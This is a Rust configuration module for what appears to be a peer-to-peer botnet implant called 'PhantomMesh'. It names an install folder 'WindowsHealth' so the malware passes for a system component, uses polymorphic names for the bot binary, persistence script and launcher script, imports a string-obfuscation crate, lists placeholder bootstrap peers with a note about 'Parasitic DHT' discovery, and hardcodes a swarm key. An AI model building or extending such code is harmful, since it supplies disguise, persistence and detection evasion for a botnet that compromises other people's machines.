use std::sync::Mutex;
use crate::security::polymorph::MorphConfig;
use crate::helpers::paths::get_appdata_dir;
use once_cell::sync::Lazy;
use obfstr::obfstr;

pub const CONFIG_FILENAME: &str = "sys_config.dat";
pub const INSTALL_DIR_NAME: &str = "WindowsHealth"; 

// V10 Standard: Bootstrap Peers (IP:Port for QUIC)
// These are placeholder addresses - in production, use Parasitic DHT discovery
pub const BOOTSTRAP_PEERS: [&str; 3] = [
    "127.0.0.1:9000",  // Local dev
    "0.0.0.0:9001",    // Placeholder
    "0.0.0.0:9002"     // Placeholder
];

// Legacy alias for compatibility
pub const BOOTSTRAP_ONIONS: [&str; 3] = BOOTSTRAP_PEERS;

// Dynamic Runtime Configuration
pub static RUNTIME_CONFIG: Lazy<Mutex<MorphConfig>> = Lazy::new(|| {
    Mutex::new(MorphConfig::generate())
});

pub fn get_bot_binary_name() -> String {
    RUNTIME_CONFIG.lock().unwrap().bot_binary.clone()
}
pub fn get_persistence_script_name() -> String {
    RUNTIME_CONFIG.lock().unwrap().persistence_script.clone()
}
pub fn get_launcher_script_name() -> String {
    RUNTIME_CONFIG.lock().unwrap().launcher_script.clone()
}

// Pre-Shared Key for Signaling Layer (32 bytes)
// In production, this should be rotated or derived dynamically.
pub const SWARM_KEY: &[u8; 32] = b"PhantomMeshV3_SecretSwarmKey_32b";
